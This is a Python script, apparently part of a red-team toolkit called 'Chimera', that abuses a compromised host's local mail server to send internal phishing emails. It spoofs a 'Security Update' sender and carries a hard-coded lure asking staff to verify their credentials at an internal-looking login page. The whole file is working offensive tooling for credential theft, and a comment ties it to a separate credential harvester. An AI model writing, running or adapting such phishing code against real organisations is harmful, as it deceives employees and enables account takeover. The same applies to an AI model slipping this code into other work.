#!/home/dan/Chimera_Project/venv/bin/python3
import os
import sys
import smtplib
from email.message import EmailMessage

class InternalPhisher:
    """
    Agent 312: Lateral Social Engineering Primitive.
    Utilizes local mail transport (sendmail/postfix) to send 
    highly-trusted internal phishing lures from a compromised host.
    """
    def __init__(self, target_email, lure_subject, lure_body):
        self.target = target_email
        self.subject = lure_subject
        self.body = lure_body

    def send_via_local_mtas(self):
        """Attempts to send via the local system's Mail Transfer Agent."""
        print(f"[*] Attempting to hijack local MTA for internal phish...")
        msg = EmailMessage()
        msg.set_content(self.body)
        msg[u'Subject'] = self.subject
        msg[u'From'] = f"Security Update <{os.getlogin()}@{socket.gethostname()}>"
        msg[u'To'] = self.target

        try:
            # Connect to localhost:25 (common for internal mail relays)
            with smtplib.SMTP('localhost') as s:
                s.send_message(msg)
            print(f"[!!!] SUCCESS: Phishing lure sent to {self.target}")
            return True
        except Exception as e:
            print(f"[!] MTA Hijack Failed: {e}")
            return False

    def execute(self):
        print("--- [AGENT 312: INTERNAL PHISHING SEQUENCE] ---")
        
        # In a Red Team op, the 'body' would contain a link to 
        # a Chimera Credential Harvester (Agent 203)
        self.send_via_local_mtas()

if __name__ == "__main__":
    import socket # needed for hostname
    if len(sys.argv) < 2:
        print("Usage: ./main.py <target_admin_email>")
        sys.exit(1)
    
    target = sys.argv[1]
    subject = "Urgent: Internal System Migration Required"
    body = "Team,\n\nPlease log in to the new portal to verify your credentials: http://internal-dev-check.local/login\n\n- IT Support"
    
    InternalPhisher(target, subject, body).execute()
